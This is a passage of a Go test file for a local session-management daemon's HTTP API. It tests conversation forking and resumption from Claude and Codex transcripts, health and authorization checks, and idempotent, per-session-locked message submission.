package api

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/coder/websocket"
	"github.com/somewhere-tech/sessions/runtime/internal/codexapp"
	"github.com/somewhere-tech/sessions/runtime/internal/ledger"
	"github.com/somewhere-tech/sessions/runtime/internal/proto"
	"github.com/somewhere-tech/sessions/runtime/internal/proto/prototest"
	"github.com/somewhere-tech/sessions/runtime/internal/recovery"
	sessionruntime "github.com/somewhere-tech/sessions/runtime/internal/session"
	"github.com/somewhere-tech/sessions/runtime/internal/state"
	"github.com/somewhere-tech/sessions/runtime/internal/watch"
)

const testToken = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

func TestNormalizeContinuationRuntime(t *testing.T) {
	for _, test := range []struct {
		input string
		want  string
		ok    bool
	}{
		{input: "", want: "", ok: true},
		{input: " Rich ", want: "rich", ok: true},
		{input: "TERMINAL", want: "terminal", ok: true},
		{input: "automatic", ok: false},
	} {
		got, err := normalizeContinuationRuntime(test.input)
		if (err == nil) != test.ok {
			t.Fatalf("normalizeContinuationRuntime(%q) error = %v, want ok=%v", test.input, err, test.ok)
		}
		if got != test.want {
			t.Fatalf("normalizeContinuationRuntime(%q) = %q, want %q", test.input, got, test.want)
		}
	}
}

func TestForkLiveConversationCreatesCopyWithoutEndingSource(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	daemon := newTestDaemon(t)
	providerID := "11111111-2222-4333-8444-555555555555"
	created, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
		Cmd: "claude", Args: []string{"--session-id", providerID},
		Cwd: daemon.root, Kind: state.KindClaudeStructured,
		Name: "Database", Description: "Live database work",
		ConversationID: providerID,
	})
	if err != nil {
		t.Fatal(err)
	}
	conversationPath := filepath.Join(
		home, ".claude", "projects", watch.EncodeClaudeCWD(daemon.root), providerID+".jsonl",
	)
	if err := os.MkdirAll(filepath.Dir(conversationPath), 0o700); err != nil {
		t.Fatal(err)
	}
	conversation := strings.Join([]string{
		`{"type":"user","uuid":"u1","timestamp":"2026-07-30T17:01:00Z","message":{"role":"user","content":"Review the migration."}}`,
		`{"type":"assistant","uuid":"a1","timestamp":"2026-07-30T17:01:02Z","message":{"role":"assistant","content":[{"type":"text","text":"The first pass is complete."}]}}`,
		`{"type":"user","uuid":"u2","timestamp":"2026-07-30T17:02:00Z","message":{"role":"user","content":"Now change production."}}`,
	}, "\n") + "\n"
	if err := os.WriteFile(conversationPath, []byte(conversation), 0o600); err != nil {
		t.Fatal(err)
	}
	daemon.handler.registry = continuationCatalog(daemon.registry)

	body := strings.NewReader(`{"sourceSessionId":"` + created.ID + `","destinationProvider":"codex","sourceMessageIndex":1,"model":"gpt-next","effort":"medium","permissions":"constrained"}`)
	response := serve(
		t, daemon.handler, http.MethodPost, "/api/recovery/fork", body, "127.0.0.1:1", nil,
	)
	if response.Code != http.StatusCreated {
		t.Fatalf("fork status=%d body=%s", response.Code, response.Body.String())
	}
	var result recovery.AdoptResult
	decodeBody(t, response, &result)
	if !result.OK || !result.SourceUntouched ||
		result.ForkedFromSessionID != created.ID ||
		result.DestinationProvider != "codex" ||
		result.ImportedMessages != 2 ||
		result.ForkPointIndex == nil || *result.ForkPointIndex != 1 ||
		result.ForkPointMessageID == "" {
		t.Fatalf("fork result = %+v", result)
	}
	source, live := daemon.registry.Get(created.ID)
	if !live || source.Info().Exited || source.Info().ReopenedAs != "" {
		t.Fatalf("source changed after fork: live=%v info=%+v", live, source.Info())
	}
	copySession, live := daemon.registry.Get(result.LaneID)
	if !live {
		t.Fatalf("forked session %s is not live", result.LaneID)
	}
	copyInfo := copySession.Info()
	if copyInfo.Tool != state.ToolCodex ||
		copyInfo.Model != "gpt-next" || copyInfo.Effort != "medium" ||
		copyInfo.Permissions != state.PermissionsConstrained ||
		copyInfo.DisplayParentSessionID == nil ||
		*copyInfo.DisplayParentSessionID != created.ID {
		t.Fatalf("forked session = %+v", copyInfo)
	}
	if len(daemon.launcher.Launches) != 2 {
		t.Fatalf("launch count = %d, want source + one copy", len(daemon.launcher.Launches))
	}
}

func TestResumeRestoresCodexTranscriptWhenNativeHandleWasNeverRecorded(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	daemon := newTestDaemon(t)
	profileRoot := filepath.Join(home, ".codex-work")
	created, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
		Cmd: "codex", Cwd: daemon.root, Kind: state.KindCodexAppServer,
		Name: "db-final-review-sol", Profile: "work", ConfigDir: profileRoot,
	})
	if err != nil {
		t.Fatal(err)
	}
	sourceRunner := daemon.launcher.Runner(created.ID)
	if sourceRunner == nil {
		t.Fatal("source runner was not launched")
	}
	if err := sourceRunner.Kill(context.Background()); err != nil {
		t.Fatal(err)
	}
	awaitSessionExited(t, daemon.registry, created.ID)
	pausedMarker := state.For(daemon.config.RunnerStateDir, created.ID).RestorePending
	if err := state.WriteRestorePending(pausedMarker, created.ID, "paused after reboot"); err != nil {
		t.Fatal(err)
	}

	// Codex partitions rollouts by the LOCAL date (verified against real
	// rollout files: one written 19:51 PDT lands in that day's directory, not
	// the next UTC day), and codexSessionDates resolves the search window in
	// time.Now().Location(). Deriving this path in UTC made the test fail
	// every evening west of Greenwich while staying green on UTC CI runners.
	createdAt := time.UnixMilli(created.CreatedAt)
	rolloutPath := filepath.Join(
		profileRoot, "sessions", createdAt.Format("2006"), createdAt.Format("01"),
		createdAt.Format("02"), "rollout-missing-provider-id.jsonl",
	)
	if err := os.MkdirAll(filepath.Dir(rolloutPath), 0o700); err != nil {
		t.Fatal(err)
	}
	conversation := strings.Join([]string{
		`{"timestamp":"` + createdAt.Format(time.RFC3339Nano) + `","type":"session_meta","payload":{"cwd":"` + daemon.root + `","timestamp":"` + createdAt.Format(time.RFC3339Nano) + `"}}`,
		`{"timestamp":"` + createdAt.Add(time.Second).Format(time.RFC3339Nano) + `","type":"response_item","payload":{"type":"message","role":"user","content":[{"type":"input_text","text":"Final cold review"}]}}`,
		`{"timestamp":"` + createdAt.Add(2*time.Second).Format(time.RFC3339Nano) + `","type":"response_item","payload":{"type":"message","role":"assistant","content":[{"type":"output_text","text":"Do not ship yet"}]}}`,
	}, "\n") + "\n"
	if err := os.WriteFile(rolloutPath, []byte(conversation), 0o600); err != nil {
		t.Fatal(err)
	}

	daemon.handler.registry = continuationCatalog(daemon.registry)
	body := strings.NewReader(`{"target":"` + created.ID + `","historyId":"` + created.ID + `","model":"gpt-next","effort":"medium","permissions":"constrained"}`)
	response := serve(
		t, daemon.handler, http.MethodPost, "/api/recovery/adopt", body, "127.0.0.1:1", nil,
	)
	if response.Code != http.StatusCreated {
		t.Fatalf("resume status=%d body=%s", response.Code, response.Body.String())
	}
	var result recovery.AdoptResult
	decodeBody(t, response, &result)
	if !result.OK || !result.TranscriptRecovery || result.ImportedMessages != 2 ||
		result.SourceHistoryID != created.ID || result.DestinationProvider != "codex" {
		t.Fatalf("resume result = %+v", result)
	}
	resumed, live := daemon.registry.Get(result.LaneID)
	if !live {
		t.Fatalf("resumed session %s is not live", result.LaneID)
	}
	info := resumed.Info()
	if info.Profile != "work" || info.ConfigDir != profileRoot ||
		info.ContinuedFromHistoryID != created.ID || info.ImportedMessageCount != 2 ||
		info.Model != "gpt-next" || info.Effort != "medium" ||
		info.Permissions != state.PermissionsConstrained {
		t.Fatalf("resumed session = %+v", info)
	}
	if len(daemon.launcher.Launches) != 2 {
		t.Fatalf("launch count = %d, want ended source + one successor", len(daemon.launcher.Launches))
	}
	if _, err := os.Stat(pausedMarker); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("successful explicit resume left paused marker: %v", err)
	}
}

func TestResumeUsesCodexSessionMetaWhenOnlySessionsRowMissesNativeHandle(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	daemon := newTestDaemon(t)
	profileRoot := filepath.Join(home, ".codex-work")
	created, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
		Cmd: "codex", Cwd: daemon.root, Kind: state.KindCodexAppServer,
		Name: "db-final-review-sol", Profile: "work", ConfigDir: profileRoot,
	})
	if err != nil {
		t.Fatal(err)
	}
	sourceRunner := daemon.launcher.Runner(created.ID)
	if err := sourceRunner.Kill(context.Background()); err != nil {
		t.Fatal(err)
	}
	awaitSessionExited(t, daemon.registry, created.ID)

	providerID := "01234567-89ab-4cde-8fab-0123456789ab"
	// Codex partitions rollouts by the LOCAL date (verified against real
	// rollout files: one written 19:51 PDT lands in that day's directory, not
	// the next UTC day), and codexSessionDates resolves the search window in
	// time.Now().Location(). Deriving this path in UTC made the test fail
	// every evening west of Greenwich while staying green on UTC CI runners.
	createdAt := time.UnixMilli(created.CreatedAt)
	rolloutPath := filepath.Join(
		profileRoot, "sessions", createdAt.Format("2006"), createdAt.Format("01"),
		createdAt.Format("02"), "rollout-"+providerID+".jsonl",
	)
	if err := os.MkdirAll(filepath.Dir(rolloutPath), 0o700); err != nil {
		t.Fatal(err)
	}
	conversation := strings.Join([]string{
		`{"timestamp":"` + createdAt.Format(time.RFC3339Nano) + `","type":"session_meta","payload":{"id":"` + providerID + `","cwd":"` + daemon.root + `","timestamp":"` + createdAt.Format(time.RFC3339Nano) + `"}}`,
		`{"timestamp":"` + createdAt.Add(time.Second).Format(time.RFC3339Nano) + `","type":"response_item","payload":{"type":"message","role":"user","content":[{"type":"input_text","text":"Final cold review"}]}}`,
	}, "\n") + "\n"
	if err := os.WriteFile(rolloutPath, []byte(conversation), 0o600); err != nil {
		t.Fatal(err)
	}

	daemon.handler.registry = continuationCatalog(daemon.registry)
	body := strings.NewReader(`{"target":"` + created.ID + `","historyId":"` + created.ID + `","model":"gpt-next","effort":"medium","permissions":"constrained"}`)
	response := serve(
		t, daemon.handler, http.MethodPost, "/api/recovery/adopt", body, "127.0.0.1:1", nil,
	)
	if response.Code != http.StatusCreated {
		t.Fatalf("resume status=%d body=%s", response.Code, response.Body.String())
	}
	var result recovery.AdoptResult
	decodeBody(t, response, &result)
	if !result.OK || result.TranscriptRecovery || result.Adoption.ProviderUUID != providerID ||
		result.LaneID == "" {
		t.Fatalf("resume result = %+v", result)
	}
	resumed, live := daemon.registry.Get(result.LaneID)
	if !live {
		t.Fatalf("resumed session %s is not live", result.LaneID)
	}
	info := resumed.Info()
	if info.Profile != "work" || info.ConfigDir != profileRoot || info.ConversationID != providerID ||
		info.Model != "gpt-next" || info.Effort != "medium" ||
		info.Permissions != state.PermissionsConstrained {
		t.Fatalf("resumed session = %+v", info)
	}
	if len(daemon.launcher.Launches) != 2 {
		t.Fatalf("launch count = %d, want ended source + one successor", len(daemon.launcher.Launches))
	}
}

type testDaemon struct {
	config   state.Config
	registry *state.Registry
	launcher *prototest.Launcher
	handler  *Server
	root     string
}

type pendingRestoreRegistry struct {
	*state.Registry
	pending map[string]state.RestorePending
}

func (r *pendingRestoreRegistry) PendingRestore(id string) (state.RestorePending, bool) {
	pending, ok := r.pending[id]
	return pending, ok
}

func (r *pendingRestoreRegistry) RestorePendingCount() int { return len(r.pending) }

func newTestDaemon(t *testing.T) testDaemon {
	t.Helper()
	root := t.TempDir()
	webDir := filepath.Join(root, "frontend", "dist")
	if err := os.MkdirAll(webDir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(webDir, "index.html"), []byte("<!doctype html><title>sessions test ui</title>"), 0o600); err != nil {
		t.Fatal(err)
	}
	config := state.Config{
		Host: "127.0.0.1", Port: 8787,
		DefaultShell: "/bin/bash", DefaultCwd: root, DefaultCols: 300, DefaultRows: 50,
		StateRoot:       filepath.Join(root, "state"),
		RunnerStateDir:  filepath.Join(root, "state", "runners"),
		TokenPath:       filepath.Join(root, "state", "token"),
		OpenPath:        filepath.Join(root, "state", "open"),
		LaunchAgentsDir: filepath.Join(root, "LaunchAgents"),
		WebDir:          webDir,
	}
	if err := os.MkdirAll(config.StateRoot, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(config.TokenPath, []byte(testToken), 0o600); err != nil {
		t.Fatal(err)
	}
	launcher := prototest.NewLauncher()
	registry := state.NewRegistry(config, launcher)
	return testDaemon{config: config, registry: registry, launcher: launcher, handler: New(config, registry), root: root}
}

func TestHealthShapeAndStaticUI(t *testing.T) {
	daemon := newTestDaemon(t)

	health := serve(t, daemon.handler, http.MethodGet, "/api/health", nil, "198.51.100.10:4321", nil)
	if health.Code != http.StatusOK {
		t.Fatalf("health status = %d, body = %s", health.Code, health.Body.String())
	}
	var body map[string]any
	decodeBody(t, health, &body)
	for _, key := range []string{"ok", "name", "version", "status", "listen", "lan", "access", "system", "compatibility", "discovering", "sessionsLoaded", "restore"} {
		if _, exists := body[key]; !exists {
			t.Errorf("health missing key %q: %#v", key, body)
		}
	}
	listen := body["listen"].(map[string]any)
	if listen["host"] != "127.0.0.1" || listen["port"] != float64(8787) {
		t.Fatalf("unexpected listen shape: %#v", listen)
	}
	lan := body["lan"].(map[string]any)
	if lan["enabled"] != false || lan["url"] != nil {
		t.Fatalf("unexpected LAN health shape: %#v", lan)
	}
	access := body["access"].(map[string]any)
	if access["open"] != false {
		t.Fatalf("unexpected access health shape: %#v", access)
	}
	system := body["system"].(map[string]any)
	if system["os"] == "" || system["arch"] == "" {
		t.Fatalf("unexpected system health shape: %#v", system)
	}
	compatibility := body["compatibility"].(map[string]any)
	apiCompatibility := compatibility["api"].(map[string]any)
	runnerCompatibility := compatibility["runner"].(map[string]any)
	if apiCompatibility["minimumClient"] != float64(1) || apiCompatibility["maximumClient"] != float64(1) {
		t.Fatalf("unexpected API compatibility: %#v", apiCompatibility)
	}
	if runnerCompatibility["minimum"] != float64(proto.MinimumCompatibleVersion) ||
		runnerCompatibility["maximum"] != float64(proto.MaximumCompatibleVersion) {
		t.Fatalf("unexpected runner compatibility: %#v", runnerCompatibility)
	}
	restore := body["restore"].(map[string]any)
	if restore["pending"] != float64(0) || restore["automaticPinnedLimit"] != float64(state.DefaultPinnedBootRestoreLimit) ||
		restore["degraded"] != false || restore["status"] != "healthy" || body["status"] != "healthy" {
		t.Fatalf("unexpected reboot restore health: %#v", restore)
	}

	// Deep health carries live session IDs and host PIDs, so unlike plain
	// /api/health it is behind authorization. `sessions doctor` reaches it over
	// loopback locally and with a per-device token for another machine.
	anonymousDeep := serve(t, daemon.handler, http.MethodGet, "/api/health/deep", nil, "198.51.100.10:4321", nil)
	if anonymousDeep.Code != http.StatusUnauthorized {
		t.Fatalf("anonymous deep health status = %d, want %d; body=%s",
			anonymousDeep.Code, http.StatusUnauthorized, anonymousDeep.Body.String())
	}
	if strings.Contains(anonymousDeep.Body.String(), "sessions") &&
		strings.Contains(anonymousDeep.Body.String(), "pid") {
		t.Fatalf("anonymous deep health leaked diagnostics: %s", anonymousDeep.Body.String())
	}
	deep := serve(t, daemon.handler, http.MethodGet, "/api/health/deep", nil, "198.51.100.10:4321",
		http.Header{"Authorization": {"Bearer " + testToken}})
	if deep.Code != http.StatusOK {
		t.Fatalf("authorized deep health status = %d, body=%s", deep.Code, deep.Body.String())
	}
	decodeBody(t, deep, &body)
	for _, key := range []string{"uptimeSec", "sessions"} {
		if _, exists := body[key]; !exists {
			t.Errorf("deep health missing key %q: %#v", key, body)
		}
	}
	localDeep := serve(t, daemon.handler, http.MethodGet, "/api/health/deep", nil, "127.0.0.1:4567", nil)
	if localDeep.Code != http.StatusOK {
		t.Fatalf("loopback deep health status = %d, body=%s", localDeep.Code, localDeep.Body.String())
	}

	index := serve(t, daemon.handler, http.MethodGet, "/", nil, "198.51.100.10:4321", nil)
	if index.Code != http.StatusOK || !strings.Contains(index.Body.String(), "sessions test ui") {
		t.Fatalf("static index: status=%d body=%q", index.Code, index.Body.String())
	}
	spa := serve(t, daemon.handler, http.MethodGet, "/sessions/example", nil, "198.51.100.10:4321", nil)
	if spa.Code != http.StatusOK || !strings.Contains(spa.Body.String(), "sessions test ui") {
		t.Fatalf("SPA fallback: status=%d body=%q", spa.Code, spa.Body.String())
	}
}

func TestPausedAfterRebootIsDegradedAndEveryReadFailsLoudly(t *testing.T) {
	daemon := newTestDaemon(t)
	id := "11111111-2222-4333-8444-555555555555"
	registry := &pendingRestoreRegistry{
		Registry: daemon.registry,
		pending: map[string]state.RestorePending{id: {
			SessionID: id, Reason: "bounded restart recovery paused this runner", DetectedAtMS: 123,
		}},
	}
	handler := New(daemon.config, registry)

	health := serve(t, handler, http.MethodGet, "/api/health", nil, "127.0.0.1:1", nil)
	var healthBody map[string]any
	decodeBody(t, health, &healthBody)
	restore := healthBody["restore"].(map[string]any)
	if healthBody["status"] != "degraded" || restore["degraded"] != true ||
		restore["code"] != "SESSION_RESTORE_PENDING" || restore["action"] != "sessions doctor" {
		t.Fatalf("degraded health = %#v", healthBody)
	}

	for _, path := range []string{
		"/api/sessions/" + id + "/snapshot",
		"/api/sessions/" + id + "/events",
	} {
		response := serve(t, handler, http.MethodGet, path, nil, "127.0.0.1:1", nil)
		if response.Code != http.StatusConflict {
			t.Fatalf("GET %s status=%d body=%s", path, response.Code, response.Body.String())
		}
		var body map[string]any
		decodeBody(t, response, &body)
		if body["code"] != "SESSION_NEEDS_RECREATE" || body["action"] != "sessions resume "+id {
			t.Fatalf("GET %s body=%#v", path, body)
		}
	}

	unknown := serve(t, handler, http.MethodGet, "/api/sessions/not-recorded/snapshot", nil, "127.0.0.1:1", nil)
	if unknown.Code != http.StatusNotFound {
		t.Fatalf("unknown snapshot status=%d body=%s", unknown.Code, unknown.Body.String())
	}
}

// TestConcurrentSubmitKeepsEachMessageWithItsTarget pins the invariant the
// submit lock exists for: a message and the Enter that sends it reach a session
// with no other write to THAT session in between, so two agents submitting to
// one session never commit each other's half-typed line.
//
// It deliberately does not assert a global order across sessions. Submits to
// different sessions are independent work and are expected to interleave; the
// previous whole-daemon assertion also pinned the serialisation that made ten
// agents on ten sessions queue behind each other's settle delay.
func TestConcurrentSubmitKeepsEachMessageWithItsTarget(t *testing.T) {
	daemon := newTestDaemon(t)
	recorder := &recordingSessionInput{sessionService: daemon.registry}
	daemon.handler.registry = recorder
	targets := make(map[string][]string)
	for _, prefix := range []string{"ALPHA", "BRAVO", "CHARLIE"} {
		created, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
			Cmd: "/bin/bash", Cwd: daemon.root,
		})
		if err != nil {
			t.Fatal(err)
		}
		targets[created.ID] = []string{prefix + "-1", prefix + "-2"}
	}
	server := httptest.NewServer(daemon.handler)
	defer server.Close()

	var wait sync.WaitGroup
	failures := make(chan string, 2*len(targets))
	for id, texts := range targets {
		for _, text := range texts {
			id, text := id, text
			wait.Add(1)
			go func() {
				defer wait.Done()
				body := strings.NewReader(`{"data":"` + text + `"}`)
				response, err := http.Post(server.URL+"/api/sessions/"+id+"/submit", "application/json", body)
				if err != nil {
					failures <- id + ": " + err.Error()
					return
				}
				defer response.Body.Close()
				if response.StatusCode != http.StatusOK {
					encoded, _ := io.ReadAll(response.Body)
					failures <- id + ": " + response.Status + " " + string(encoded)
				}
			}()
		}
	}
	wait.Wait()
	close(failures)
	for message := range failures {
		t.Error(message)
	}

	recorder.mu.Lock()
	calls := append([]recordedSessionInput(nil), recorder.calls...)
	recorder.mu.Unlock()
	if len(calls) != 4*len(targets) {
		t.Fatalf("input calls = %#v", calls)
	}
	perSession := make(map[string][]string)
	for _, call := range calls {
		perSession[call.id] = append(perSession[call.id], call.data)
	}
	for id, texts := range targets {
		got := perSession[id]
		if len(got) != 4 {
			t.Fatalf("session %s inputs = %q", id, got)
		}
		sent := map[string]bool{}
		for index := 0; index < len(got); index += 2 {
			if got[index+1] != "\r" {
				t.Fatalf("session %s interleaved a write between a message and its Enter: %q", id, got)
			}
			sent[got[index]] = true
		}
		for _, text := range texts {
			if !sent[text] {
				t.Fatalf("session %s inputs = %q, want both of %q", id, got, texts)
			}
		}
		if runnerInputs := daemon.launcher.Runner(id).Inputs(); len(runnerInputs) != 4 {
			t.Fatalf("runner %s inputs = %q", id, runnerInputs)
		}
	}
	if tracked := daemon.handler.submits.tracked(); tracked != 0 {
		t.Fatalf("per-session submit locks retained after every submit finished: %d", tracked)
	}
}

func TestSubmitOperationIsIdempotentAcrossDaemonRestart(t *testing.T) {
	daemon := newTestDaemon(t)
	recorder := &recordingSessionInput{sessionService: daemon.registry}
	daemon.handler.registry = recorder
	created, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
		Cmd: "/bin/bash", Cwd: daemon.root,
	})
	if err != nil {
		t.Fatal(err)
	}
	const operationID = "11111111-2222-4333-8444-555555555555"
	body := `{"data":"ship exactly once","operation_id":"` + operationID + `"}`

	first := serve(t, daemon.handler, http.MethodPost, "/api/sessions/"+created.ID+"/submit", strings.NewReader(body), "127.0.0.1:4567", nil)
	if first.Code != http.StatusOK {
		t.Fatalf("first submit = %d %s", first.Code, first.Body.String())
	}
	var firstReceipt map[string]any
	decodeBody(t, first, &firstReceipt)
	if firstReceipt["operation_id"] != operationID || firstReceipt["status"] != "accepted" || firstReceipt["duplicate"] != false {
		t.Fatalf("first receipt = %#v", firstReceipt)
	}

	// New Server means a new in-memory submit lock and delivery service. The
	// receipt on disk, not process memory, must be what prevents the resend.
	restarted := New(daemon.config, recorder)
	second := serve(t, restarted, http.MethodPost, "/api/sessions/"+created.ID+"/submit", strings.NewReader(body), "127.0.0.1:4567", nil)
	if second.Code != http.StatusOK {
		t.Fatalf("duplicate submit = %d %s", second.Code, second.Body.String())
	}
	var secondReceipt map[string]any
	decodeBody(t, second, &secondReceipt)
	if secondReceipt["status"] != "accepted" || secondReceipt["duplicate"] != true {
		t.Fatalf("duplicate receipt = %#v", secondReceipt)
	}

	recorder.mu.Lock()
	calls := append([]recordedSessionInput(nil), recorder.calls...)
	recorder.mu.Unlock()
	if len(calls) != 2 || calls[0].data != "ship exactly once" || calls[1].data != "\r" {
		t.Fatalf("runner inputs = %#v, want one text + Enter pair", calls)
	}

	status := serve(t, restarted, http.MethodGet, "/api/message-deliveries/"+operationID, nil, "127.0.0.1:4567", nil)
	if status.Code != http.StatusOK {
		t.Fatalf("delivery status = %d %s", status.Code, status.Body.String())
	}
	var statusReceipt map[string]any
	decodeBody(t, status, &statusReceipt)
	if statusReceipt["status"] != "accepted" || statusReceipt["session_id"] != created.ID {
		t.Fatalf("status receipt = %#v", statusReceipt)
	}
}

func TestPendingSubmitOperationIsReportedUnknownAndNeverRetried(t *testing.T) {
	daemon := newTestDaemon(t)
	recorder := &recordingSessionInput{sessionService: daemon.registry}
	daemon.handler.registry = recorder
	created, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
		Cmd: "/bin/bash", Cwd: daemon.root,
	})
	if err != nil {
		t.Fatal(err)
	}
	const operationID = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"
	const message = "outcome was lost"
	if _, createdRecord, err := daemon.handler.deliveries.Begin(operationID, created.ID, message); err != nil || !createdRecord {
		t.Fatalf("seed pending operation: created=%t err=%v", createdRecord, err)
	}
	body := `{"data":"` + message + `","operation_id":"` + operationID + `"}`
	result := serve(t, daemon.handler, http.MethodPost, "/api/sessions/"+created.ID+"/submit", strings.NewReader(body), "127.0.0.1:4567", nil)
	if result.Code != http.StatusOK {
		t.Fatalf("pending duplicate = %d %s", result.Code, result.Body.String())
	}
	var receipt map[string]any
	decodeBody(t, result, &receipt)
	if receipt["status"] != "unknown" || receipt["retry"] != false || receipt["duplicate"] != true {
		t.Fatalf("pending receipt = %#v", receipt)
	}
	recorder.mu.Lock()
	defer recorder.mu.Unlock()
	if len(recorder.calls) != 0 {
		t.Fatalf("pending operation was resent: %#v", recorder.calls)
	}
}

func TestSubmitRefusesClaudeFolderTrustControlWithoutTyping(t *testing.T) {
	daemon := newTestDaemon(t)
	recorder := &recordingSessionInput{sessionService: daemon.registry}
	daemon.handler.registry = recorder
	created, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
		Cmd: "claude", Cwd: daemon.root,
	})
	if err != nil {
		t.Fatal(err)
	}
	live, ok := daemon.registry.Get(created.ID)
	if !ok {
		t.Fatal("created session is not live")
	}
	live.SetIdleResult(
		state.IdleReasonNeedsInput,
		"Claude is waiting for you to trust this folder",
		"",
		time.Now().UnixMilli(),
	)

	result := serve(
		t, daemon.handler, http.MethodPost, "/api/sessions/"+created.ID+"/submit",
		strings.NewReader(`{"data":"please inspect this repository"}`), "127.0.0.1:4567", nil,
	)
	if result.Code != http.StatusNotFound {
		t.Fatalf("submit = %d %s", result.Code, result.Body.String())
	}
	var receipt map[string]any
	decodeBody(t, result, &receipt)
	if receipt["status"] != "not-delivered" || receipt["delivered"] != false || receipt["retry"] != true ||
		!strings.Contains(receipt["reason"].(string), "Terminal view") {
		t.Fatalf("receipt = %#v", receipt)
	}
	recorder.mu.Lock()
	defer recorder.mu.Unlock()
	if len(recorder.calls) != 0 {
		t.Fatalf("trust control received semantic input: %#v", recorder.calls)
	}
}

// TestSubmitsToDifferentSessionsRunConcurrently is the scaling half of the same
// invariant. Every submit holds its session's lock across a fixed settle delay;
// with one process-wide lock, N agents on N different sessions took N delays.
func TestSubmitsToDifferentSessionsRunConcurrently(t *testing.T) {
	daemon := newTestDaemon(t)
	const sessions = 8
	ids := make([]string, 0, sessions)
	for index := 0; index < sessions; index++ {
		created, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
			Cmd: "/bin/bash", Cwd: daemon.root,
		})
		if err != nil {
			t.Fatal(err)
		}
		ids = append(ids, created.ID)
	}
	server := httptest.NewServer(daemon.handler)
	defer server.Close()

	var ready, wait sync.WaitGroup
	ready.Add(len(ids))
	start := make(chan struct{})
	failures := make(chan string, len(ids))
	for _, id := range ids {
		id := id
		wait.Add(1)
		go func() {
			defer wait.Done()
			ready.Done()
			<-start
			body := strings.NewReader(`{"data":"parallel"}`)
			response, err := http.Post(server.URL+"/api/sessions/"+id+"/submit", "application/json", body)
			if err != nil {
				failures <- id + ": " + err.Error()
				return
			}
			defer response.Body.Close()
			if response.StatusCode != http.StatusOK {
				encoded, _ := io.ReadAll(response.Body)
				failures <- id + ": " + response.Status + " " + string(encoded)
			}
		}()
	}
	ready.Wait()
	began := time.Now()
	close(start)
	wait.Wait()
	elapsed := time.Since(began)
	close(failures)
	for message := range failures {
		t.Error(message)
	}
	// Concurrent: about one settle delay for all of them. Serialised: eight.
	if limit := 3 * submitSettleDelay; elapsed > limit {
		t.Fatalf("%d submits to %d different sessions took %s, want under %s: they are serialising on a shared lock",
			len(ids), len(ids), elapsed, limit)
	}
	for _, id := range ids {
		if got := daemon.launcher.Runner(id).Inputs(); len(got) != 2 || got[0] != "parallel" || got[1] != "\r" {
			t.Fatalf("runner %s inputs = %q", id, got)
		}
	}
	if tracked := daemon.handler.submits.tracked(); tracked != 0 {
		t.Fatalf("per-session submit locks retained after every submit finished: %d", tracked)
	}
}

type recordedSessionInput struct {
	id   string
	data string
}

type recordingSessionInput struct {
	sessionService
	mu    sync.Mutex
	calls []recordedSessionInput
}

func (r *recordingSessionInput) Input(ctx context.Context, id, data string) bool {
	r.mu.Lock()
	r.calls = append(r.calls, recordedSessionInput{id: id, data: data})
	r.mu.Unlock()
	return r.sessionService.Input(ctx, id, data)
}

func TestAuthenticatedMachineIdentityUsesStableIDAndLoadedName(t *testing.T) {
	daemon := newTestDaemon(t)
	daemon.handler.identity.Name = "Friendly computer name"
	unauthorized := serve(t, daemon.handler, http.MethodGet, "/api/machine", nil, "198.51.100.25:5555", nil)
	if unauthorized.Code != http.StatusUnauthorized {
		t.Fatalf("remote machine identity status = %d, body = %s", unauthorized.Code, unauthorized.Body.String())
	}
	response := serve(t, daemon.handler, http.MethodGet, "/api/machine", nil, "127.0.0.1:4321", nil)
	if response.Code != http.StatusOK {
		t.Fatalf("machine identity status = %d, body = %s", response.Code, response.Body.String())
	}
	var body struct {
		MachineID string `json:"machine_id"`
		Name      string `json:"name"`
	}
	decodeBody(t, response, &body)
	if body.MachineID != daemon.handler.identity.ID {
		t.Fatalf("machine id = %q, want %q", body.MachineID, daemon.handler.identity.ID)
	}
	if body.Name != daemon.handler.identity.Name {
		t.Fatalf("machine name = %q, want loaded identity name %q", body.Name, daemon.handler.identity.Name)
	}
}

func TestKnownMutationRoutesReturnMethodNotAllowed(t *testing.T) {
	daemon := newTestDaemon(t)
	info, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
		Cmd: "/bin/bash", Cwd: daemon.root,
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, path := range []string{
		"/api/retention/gc",
		"/api/retention/archive",
		"/api/worktrees",
		"/api/worktrees/clean",
		"/api/lanes",
		// These four answered 404 for a wrong verb while every sibling
		// answered 405, so a caller could not tell a mistyped method from a
		// route or session that does not exist.
		"/api/providers",
		"/api/providers/claude/update",
		"/api/sessions/" + info.ID + "/wait",
		"/api/sessions/" + info.ID + "/wait-state",
	} {
		response := serve(t, daemon.handler, http.MethodPatch, path, nil, "127.0.0.1:4321", nil)
		if response.Code != http.StatusMethodNotAllowed {
			t.Errorf("%s status=%d body=%s", path, response.Code, response.Body.String())
		}
	}
	// A wrong verb is still 405 for a session that does not exist, and a
	// correct verb still reports the missing session as 404.
	missing := serve(t, daemon.handler, http.MethodPatch, "/api/sessions/missing/wait", nil, "127.0.0.1:4321", nil)
	if missing.Code != http.StatusMethodNotAllowed {
		t.Errorf("PATCH wait on missing session status=%d body=%s", missing.Code, missing.Body.String())
	}
	found := serve(t, daemon.handler, http.MethodGet, "/api/sessions/missing/wait", nil, "127.0.0.1:4321", nil)
	if found.Code != http.StatusNotFound {
